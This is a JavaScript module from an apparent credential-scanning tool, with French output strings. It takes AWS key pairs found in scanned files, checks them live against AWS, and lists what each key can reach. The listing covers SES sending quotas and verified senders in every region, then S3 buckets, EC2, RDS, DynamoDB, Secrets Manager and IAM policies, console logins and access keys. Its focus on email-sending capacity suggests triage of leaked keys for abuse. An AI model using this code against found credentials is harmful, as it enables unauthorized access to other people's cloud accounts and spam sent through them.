import { isAwsAccessKey, isValidAwsSecretKey, isVendorSecretPath } from "@scanner/core";
import { AWS_SES_REGIONS, STS_REGIONS, awsDenied, awsJson, awsOk, awsQuery, awsS3List, extractXml, extractXmlList, } from "./aws-api.js";
function take(list, n) {
    return list.slice(0, n);
}
async function silent(fn) {
    try {
        return await fn();
    }
    catch {
        return null;
    }
}
export function formatAwsPermLines(perms) {
    const ok = perms.filter((p) => p.ok);
    const bad = perms.filter((p) => !p.ok);
    const lines = [];
    if (ok.length) {
        lines.push("Permissions Actives:");
        for (const p of ok) {
            lines.push(p.details ? `✅ ${p.service} (${p.action}): ${p.details}` : `✅ ${p.service} (${p.action})`);
        }
        if (bad.length) {
            lines.push("", "Permissions Inaccessibles / Non Configurées:");
            for (const p of bad)
                lines.push(`❌ ${p.service} (${p.action})`);
        }
    }
    else {
        lines.push("Aucune permission active détectée parmi les services testés :");
        for (const p of perms)
            lines.push(`❌ ${p.service} (${p.action})`);
    }
    return lines.join("\n");
}
export class AwsHandler {
    http;
    service = "aws";
    constructor(http) {
        this.http = http;
    }
    async validate(hit, match, siblings) {
        if (isVendorSecretPath(hit.path) || isVendorSecretPath(hit.blobPath)) {
            return { service: "aws", valid: false, raw: true, details: "vendor path — skip", meta: { skipNotify: "1" } };
        }
        if (!isAwsAccessKey(match.value)) {
            return { service: "aws", valid: false, raw: true, details: "valeur AWS non-AKIA — non validé", meta: { skipNotify: "1" } };
        }
        const access = match.value;
        const secret = siblings.find((s) => s.value !== access && isValidAwsSecretKey(s.value))?.value;
        if (!secret) {
            return {
                service: "aws",
                valid: false,
                raw: true,
                details: "AKIA without valid secret (reCAPTCHA / incomplet) — skip",
                meta: { skipNotify: "1" },
            };
        }
        const hintRegion = siblings.find((s) => s.service === "aws.region")?.value ?? "";
        const id = await this.identify(access, secret, hintRegion);
        if (!id.valid) {
            return { service: "aws", valid: false, details: id.err || "Invalid credentials", error: id.err };
        }
        const { perms, sesBlock } = await this.probe(access, secret, id.region || "us-east-1");
        const ses = perms.filter((p) => p.ok && p.service === "SES");
        const active = perms.filter((p) => p.ok);
        const services = [...new Set(active.map((p) => p.service))];
        const sesEnabled = ses.some((p) => p.action === "RÉSUMÉ");
        const quota = Number(id.sesQuota || ses.find((p) => p.action === "RÉSUMÉ")?.details.match(/Quota total: (\d+)/)?.[1] || 0);
        const meta = {
            account: id.account,
            arn: id.arn,
            region: id.region,
            permBlock: formatAwsPermLines(perms),
        };
        if (sesBlock)
            meta.sesBlock = sesBlock;
        if (sesEnabled) {
            return {
                service: "aws",
                valid: true,
                details: `SES ACTIF (${quota || id.sesQuota} emails/jour)`,
                meta: { ...meta, statusKind: "ses", sesQuota: String(quota || id.sesQuota) },
            };
        }
        if (active.length) {
            return {
                service: "aws",
                valid: true,
                details: `Actif (${services.length} services: ${services.join(", ")})`,
                meta,
            };
        }
        return {
            service: "aws",
            valid: false,
            details: "Clé authentique mais 0 permission active",
            meta: { ...meta, statusKind: "zero-perm" },
        };
    }
    async identify(access, secret, hintRegion) {
        let sawAccessDenied = false;
        let sawInvalid = false;
        let region = hintRegion || "us-east-1";
        let account = "";
        let arn = "";
        for (const r of hintRegion ? [hintRegion, ...STS_REGIONS.filter((x) => x !== hintRegion)] : STS_REGIONS) {
            const body = await silent(() => awsQuery(this.http, "sts", r, access, secret, "Action=GetCallerIdentity&Version=2011-06-15"));
            if (!body)
                continue;
            if ((body.includes("GetCallerIdentityResponse") || body.includes("<Account>")) && body.includes("<Arn>")) {
                return {
                    valid: true,
                    account: extractXml(body, "Account"),
                    arn: extractXml(body, "Arn"),
                    region: r,
                    err: "",
                    sesQuota: "",
                    sesDetails: "",
                };
            }
            if (body.includes("AccessDenied")) {
                sawAccessDenied = true;
                region = r;
                break;
            }
            if (body.includes("InvalidClientTokenId") || body.includes("SignatureDoesNotMatch"))
                sawInvalid = true;
        }
        if (sawAccessDenied) {
            const iam = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, "Action=GetUser&Version=2010-05-08"));
            if (iam && (iam.includes("<User>") || bodyHasUser(iam))) {
                return {
                    valid: true,
                    account: extractXml(iam, "UserId") || "IAM",
                    arn: extractXml(iam, "Arn"),
                    region,
                    err: "",
                    sesQuota: "",
                    sesDetails: "",
                };
            }
            const quota = await silent(() => awsQuery(this.http, "email", "us-east-1", access, secret, "Action=GetSendQuota"));
            if (quota && (quota.includes("Max24HourSend") || quota.includes("GetSendQuotaResult"))) {
                return {
                    valid: true,
                    account: "Valid (SES)",
                    arn: "",
                    region: region || "us-east-1",
                    err: "",
                    sesQuota: extractXml(quota, "Max24HourSend"),
                    sesDetails: "",
                };
            }
            return {
                valid: true,
                account: "AccessDenied (Auth OK)",
                arn: "",
                region,
                err: "",
                sesQuota: "",
                sesDetails: "",
            };
        }
        return {
            valid: false,
            account,
            arn,
            region,
            err: sawInvalid ? "Invalid credentials (Signature/Token mismatch)" : "Invalid credentials or unreachable",
            sesQuota: "",
            sesDetails: "",
        };
    }
    async probe(access, secret, region) {
        const [ses, rest] = await Promise.all([this.ses(access, secret), this.other(access, secret, region)]);
        return { perms: [...ses.perms, ...rest], sesBlock: ses.sesBlock };
    }
    async ses(access, secret) {
        const perms = [];
        const activeRegions = [];
        const senders = new Set();
        const domains = new Set();
        let totalQuota = 0;
        let sendingEnabled = false;
        const sesLines = [];
        const chunks = [];
        for (let i = 0; i < AWS_SES_REGIONS.length; i += 4)
            chunks.push(AWS_SES_REGIONS.slice(i, i + 4));
        for (const batch of chunks) {
            await Promise.all(batch.map(async (r) => {
                const quota = await silent(() => awsQuery(this.http, "email", r, access, secret, "Action=GetSendQuota"));
                if (!quota || awsDenied(quota) || quota.includes("Error"))
                    return;
                if (!quota.includes("GetSendQuotaResult") && !quota.includes("Max24HourSend"))
                    return;
                const maxSend = extractXml(quota, "Max24HourSend");
                const sentLast24 = extractXml(quota, "SentLast24Hours");
                const maxRate = extractXml(quota, "MaxSendRate");
                const maxVal = Math.floor(Number(maxSend));
                if (!maxSend || maxSend === "0" || maxSend === "-1" || maxVal <= 0)
                    return;
                activeRegions.push(r);
                totalQuota += maxVal;
                perms.push({
                    service: "SES",
                    action: `GetSendQuota:${r}`,
                    ok: true,
                    details: `Max: ${maxSend}/jour | Envoyés: ${sentLast24} | Rate: ${maxRate}/s`,
                });
                const emails = await silent(() => awsQuery(this.http, "email", r, access, secret, "Action=ListIdentities&MaxItems=100&IdentityType=EmailAddress"));
                const regionSenders = emails && !awsDenied(emails) ? extractXmlList(emails, "member") : [];
                for (const e of regionSenders)
                    senders.add(e);
                if (regionSenders.length) {
                    perms.push({
                        service: "SES",
                        action: `ListIdentities(Email):${r}`,
                        ok: true,
                        details: `${regionSenders.length}: ${take(regionSenders, 5).join(", ")}`,
                    });
                }
                const doms = await silent(() => awsQuery(this.http, "email", r, access, secret, "Action=ListIdentities&MaxItems=100&IdentityType=Domain"));
                const regionDomains = doms && !awsDenied(doms) ? extractXmlList(doms, "member") : [];
                for (const d of regionDomains)
                    domains.add(d);
                if (regionDomains.length) {
                    perms.push({
                        service: "SES",
                        action: `ListIdentities(Domain):${r}`,
                        ok: true,
                        details: `${regionDomains.length}: ${take(regionDomains, 3).join(", ")}`,
                    });
                }
                sesLines.push(`🔘 ${r} — ${maxVal}/day | Rate: ${maxRate}/s | Sent24h: ${sentLast24}` +
                    (regionSenders.length ? `\n   📧 From: ${take(regionSenders, 5).join(", ")}` : ""));
                if (!sendingEnabled) {
                    const en = await silent(() => awsQuery(this.http, "email", r, access, secret, "Action=GetAccountSendingEnabled"));
                    if (en && !awsDenied(en) && extractXml(en, "Enabled").toLowerCase() === "true")
                        sendingEnabled = true;
                }
            }));
        }
        let sesBlock = "";
        if (activeRegions.length) {
            const status = sendingEnabled ? "🟢 ACTIVÉ" : "🟠 SANDBOX";
            perms.unshift({
                service: "SES",
                action: "RÉSUMÉ",
                ok: true,
                details: `${status} | ${activeRegions.length} région(s) | Quota total: ${totalQuota}/jour | ${senders.size} sender(s) | ${domains.size} domaine(s)`,
            });
            sesBlock = [
                "SES QUOTAS:",
                `📧 Total: ${totalQuota} emails/day`,
                `🌍 Active regions: ${activeRegions.length}`,
                `📬 Verified senders: ${senders.size}`,
                "",
                ...sesLines,
            ].join("\n");
        }
        else {
            perms.push({ service: "SES", action: "GetSendQuota", ok: false, details: "Aucune région SES active" });
        }
        return { perms, sesBlock };
    }
    async other(access, secret, region) {
        const perms = [];
        const s3 = await silent(() => awsS3List(this.http, access, secret));
        if (s3 && awsOk(s3, "<ListAllMyBucketsResult", "<Buckets>")) {
            const buckets = extractXmlList(s3, "Name").filter((n) => n && !n.includes(" "));
            perms.push({
                service: "S3",
                action: "ListBuckets",
                ok: true,
                details: buckets.length ? `${buckets.length} bucket(s): ${take(buckets, 5).join(", ")}` : "Accès autorisé (0 bucket existant)",
            });
        }
        else {
            perms.push({ service: "S3", action: "ListBuckets", ok: false, details: "" });
        }
        const probes = [
            {
                service: "EC2",
                action: "DescribeInstances",
                svc: "ec2",
                params: "Action=DescribeInstances&Version=2016-11-15",
                needles: ["DescribeInstancesResponse"],
                listTag: "instanceId",
                empty: "Instances accessibles (0 instance en cours)",
                label: (n) => `${n.length} instance(s) accessibles`,
            },
            {
                service: "SNS",
                action: "ListTopics",
                svc: "sns",
                params: "Action=ListTopics&Version=2010-03-31",
                needles: ["ListTopicsResponse", "<Topics>"],
                listTag: "TopicArn",
                empty: "0 topic(s)",
                label: (n) => `${n.length} topic(s)`,
            },
            {
                service: "SQS",
                action: "ListQueues",
                svc: "sqs",
                params: "Action=ListQueues&Version=2012-11-05",
                needles: ["ListQueuesResponse", "<QueueUrl>"],
                listTag: "QueueUrl",
                empty: "0 file(s) SQS",
                label: (n) => `${n.length} file(s) SQS`,
            },
            {
                service: "RDS",
                action: "DescribeDBInstances",
                svc: "rds",
                params: "Action=DescribeDBInstances&Version=2014-10-31",
                needles: ["DescribeDBInstancesResponse"],
                listTag: "DBInstanceIdentifier",
                empty: "0 base(s) RDS",
                label: (n) => `${n.length} base(s) RDS`,
            },
        ];
        await Promise.all(probes.map(async (p) => {
            const body = await silent(() => awsQuery(this.http, p.svc, region, access, secret, p.params));
            if (body && awsOk(body, ...p.needles)) {
                const items = extractXmlList(body, p.listTag);
                perms.push({ service: p.service, action: p.action, ok: true, details: items.length ? p.label(items) : p.empty });
            }
            else {
                perms.push({ service: p.service, action: p.action, ok: false, details: "" });
            }
        }));
        const ddb = await silent(() => awsJson(this.http, "dynamodb", region, "DynamoDB_20120810.ListTables", access, secret));
        if (ddb && ddb.includes("TableNames") && !awsDenied(ddb)) {
            let tables = [];
            try {
                tables = (JSON.parse(ddb).TableNames ?? []).filter(Boolean);
            }
            catch {
                tables = extractXmlList(ddb, "member");
            }
            perms.push({
                service: "DynamoDB",
                action: "ListTables",
                ok: true,
                details: tables.length ? `${tables.length} table(s): ${take(tables, 3).join(", ")}` : "Accès DynamoDB tables",
            });
        }
        else {
            perms.push({ service: "DynamoDB", action: "ListTables", ok: false, details: "" });
        }
        const sm = await silent(() => awsJson(this.http, "secretsmanager", region, "secretsmanager.ListSecrets", access, secret));
        if (sm && sm.includes("SecretList") && !awsDenied(sm)) {
            perms.push({ service: "SecretsManager", action: "ListSecrets", ok: true, details: "Accès secrets chiffrés" });
        }
        else {
            perms.push({ service: "SecretsManager", action: "ListSecrets", ok: false, details: "" });
        }
        await this.iam(access, secret, perms);
        return perms;
    }
    async iam(access, secret, perms) {
        const userBody = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, "Action=GetUser&Version=2010-05-08"));
        let iamTested = false;
        const userName = userBody && awsOk(userBody, "<GetUserResponse>", "<User>") ? extractXml(userBody, "UserName") : "";
        if (userName) {
            iamTested = true;
            perms.push({
                service: "IAM",
                action: "GetUser",
                ok: true,
                details: `User: ${userName} | ARN: ${extractXml(userBody, "Arn")}`,
            });
            const inline = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, `Action=ListUserPolicies&UserName=${encodeURIComponent(userName)}&Version=2010-05-08`));
            if (inline && !awsDenied(inline)) {
                const policies = extractXmlList(inline, "member");
                if (policies.length) {
                    perms.push({
                        service: "IAM",
                        action: "ListUserPolicies",
                        ok: true,
                        details: `${policies.length} inline: ${take(policies, 5).join(", ")}`,
                    });
                }
            }
            const attached = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, `Action=ListAttachedUserPolicies&UserName=${encodeURIComponent(userName)}&Version=2010-05-08`));
            if (attached && !awsDenied(attached)) {
                const names = extractXmlList(attached, "PolicyName");
                if (names.length) {
                    perms.push({
                        service: "IAM",
                        action: "ListAttachedPolicies",
                        ok: true,
                        details: `${names.length} managed: ${take(names, 5).join(", ")}`,
                    });
                }
            }
            const groups = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, `Action=ListGroupsForUser&UserName=${encodeURIComponent(userName)}&Version=2010-05-08`));
            if (groups && !awsDenied(groups)) {
                const g = extractXmlList(groups, "GroupName");
                if (g.length) {
                    perms.push({ service: "IAM", action: "ListGroups", ok: true, details: `${g.length} groups: ${take(g, 5).join(", ")}` });
                }
            }
            const login = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, `Action=GetLoginProfile&UserName=${encodeURIComponent(userName)}&Version=2010-05-08`));
            if (login?.includes("<LoginProfile>")) {
                perms.push({
                    service: "IAM",
                    action: "ConsoleAccess",
                    ok: true,
                    details: `Console login ACTIVÉ (créé: ${extractXml(login, "CreateDate")})`,
                });
            }
        }
        if (!iamTested) {
            const users = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, "Action=ListUsers&Version=2010-05-08"));
            if (users && awsOk(users, "<ListUsersResponse>")) {
                const names = extractXmlList(users, "UserName");
                perms.push({ service: "IAM", action: "ListUsers", ok: true, details: `${names.length} utilisateur(s) IAM` });
            }
            else {
                perms.push({ service: "IAM", action: "GetUser", ok: false, details: "" });
            }
        }
        const keys = await silent(() => awsQuery(this.http, "iam", "us-east-1", access, secret, "Action=ListAccessKeys&Version=2010-05-08"));
        if (keys && awsOk(keys, "<ListAccessKeysResponse>")) {
            const ids = extractXmlList(keys, "AccessKeyId");
            if (ids.length) {
                perms.push({ service: "IAM", action: "ListAccessKeys", ok: true, details: `${ids.length} clé(s): ${ids.join(", ")}` });
            }
        }
    }
}
function bodyHasUser(body) {
    return body.includes("<UserName>");
}
